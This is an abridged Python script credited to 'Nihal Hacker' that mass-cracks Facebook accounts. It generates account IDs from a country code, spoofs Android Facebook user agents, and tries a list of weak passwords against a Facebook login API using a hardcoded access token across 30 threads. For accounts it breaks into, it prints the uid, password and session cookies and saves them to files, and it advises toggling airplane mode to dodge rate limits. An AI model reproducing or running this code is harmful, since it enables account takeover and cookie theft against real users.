#OWNER_______________Nihal Hacker
...
def S1():
	...
	e = ";[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = s + e	
	return ua
...
for xd in range(10000):
        ...
        g='AppleWebKit/537.36 (KHokL, like Gecko) Chrome/'
...
for agent in range(10000):
        ...
        g='AppleWebKit/537.36 (KHokL, like Gecko) Chrome/89.0.4389.99'
...
O:::::::OOO:::::::OK:::::::K   K::::::K     
 OO:::::::::::::OO K:::::::K    K:::::K     
   OO:::::::::OO   K:::::::K    K:::::K     
     OOOOOOOOO     KKKKKKKKK    KKKKKKK     
 \033[1;92m----------------------------------------------
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝘼𝙐𝙏𝙃𝙊𝙍      :\033[1;92m  √  𝐍𝐈HAL HACKER
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : \033[1;92m √  +𝟗23135887879 
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 : \033[92;1m √  Nihal 𝐓𝐄𝐀𝐌 𝐌𝐀𝐅𝐈𝐀  
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝗦𝗧𝗔𝗧𝗨𝗦      : \033[1;97m √  𝐅𝐑𝐄𝐄
 \033[1;97m[ \033[1;92m+ \033[1;97m]  \033[1;92m𝗩𝗘𝗥𝗦𝗜𝗢𝗡     : \033[1;92m √  1.𝟎  
 \033[1;92m---------------------------------------------"""
def line():
	print(f'\033[1;92m----------------------------------------------------')
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m After Every 5 Min Turn Airplane On/Off For 5 sec\033[1;37m")
                                        line()
                                        for user in fo:
                                ...
                                clear()
                                print(' \033[97;1m[1] Afghanistan Facebook IDs\n [0] BACK MENU')
                                line()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        afg()          
...
def afg():
                user=[]
                clear()
                print('\x1b[1;92m ENTER YOUR COUNTRY CODE HERE')
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        tl = str(len(user))
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;92mTOTAL ACCOUNT: \033[1;97m'+tl)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;92mSELECT CODE  : \033[1;97m'+code)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;92mTurn Airplane Mode  On/Off For 5 sec \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','khan123','khan123456','khan786','123456789','555555','ahmad123','jan123']
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mok\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [ok-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/ok-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [OK-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/OK-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m\x1b[1;92m [ Loading... \x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			ua = 'Dalvik/2.1.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21) FBAN/Orca-Android;FBAV/221.1.0.15.157;FBPN/com.facebook.orca;FBLC/en_US;FBBV/160677542;FBCR/Ooredoo;FBMF/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1020,height=2040};FB_FW/;] FBBK/1'			
			...
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				print('\r\r\033[1;32m [WOW😲] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [ok-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ok-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
